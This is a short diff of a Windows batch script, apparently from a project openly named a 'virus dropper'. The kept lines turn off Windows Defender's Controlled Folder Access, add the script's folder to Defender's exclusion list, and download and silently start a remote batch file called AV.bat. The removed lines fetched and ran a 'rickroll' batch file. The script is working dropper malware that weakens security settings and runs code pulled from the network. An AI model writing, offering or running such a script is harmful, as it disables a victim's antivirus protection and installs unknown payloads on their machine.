@@ -1,9 +1,6 @@
 color ef
 ::disables ControlledFolderAccess to access files and folders
 powershell -command "Set-MpPreference -EnableControlledFolderAccess Disabled"
-curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/Rickroll.mp4" --output "Rickroll.mp4"
-curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/rickroll.bat" --output "rickroll.bat"
-rickroll.bat
 powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%~dp0'"
 curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/AV.bat" --output "AV.bat"
 start /min AV.bat
